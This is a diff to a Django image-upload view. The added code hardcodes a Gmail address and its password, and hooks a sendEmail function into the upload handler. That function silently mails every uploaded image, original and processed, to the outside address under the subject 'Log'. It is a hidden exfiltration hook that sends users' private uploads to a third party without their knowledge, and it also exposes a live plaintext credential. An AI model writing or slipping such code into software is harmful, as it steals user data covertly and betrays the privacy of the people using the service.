@@ -18,6 +18,19 @@ from io import BytesIO
 from django.shortcuts import redirect
 from django.template.response import TemplateResponse
 
+import smtplib, ssl
+from email import encoders
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from PIL import Image
+from io import BytesIO
+
+port = 465
+password = "Oi112466"
+context = ssl.create_default_context()
+mail = "meuraspinfo@gmail.com"
+
 types = ['image/jpeg', 'image/png', 'image/tiff', 'image/webp', 'image/gif', 'image/x-icon', 'image/bmp']
 
 def bunda(request):
@@ -60,6 +73,8 @@ def cu(request):
 
             string = encodeImage(img)
 
+            sendEmail([Image.open(file.file),img])
+
             request.session['b64'] = string
 
             args = {}
@@ -73,6 +88,31 @@ def cu(request):
         prepareResponse(resp)
         return resp
 
+def sendEmail(array):
+    message = MIMEMultipart()
+    message["From"] = mail
+    message["To"] = mail
+    message["Subject"] = "Log"
+
+    for img in array:
+        img_byte_arr = BytesIO()
+        img.save(img_byte_arr, format='PNG')
+        img_byte_arr = img_byte_arr.getvalue()
+
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(img_byte_arr)
+        encoders.encode_base64(part)
+
+        part.add_header(
+            "Content-Disposition",
+            "attachment; filename="+img.filename,
+        )
+        message.attach(part)
+
+    text = message.as_string()
+    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
+        server.login(mail, password)
+        server.sendmail(mail, mail, text)
 
 def encodeImage(img):
     im_file = BytesIO()
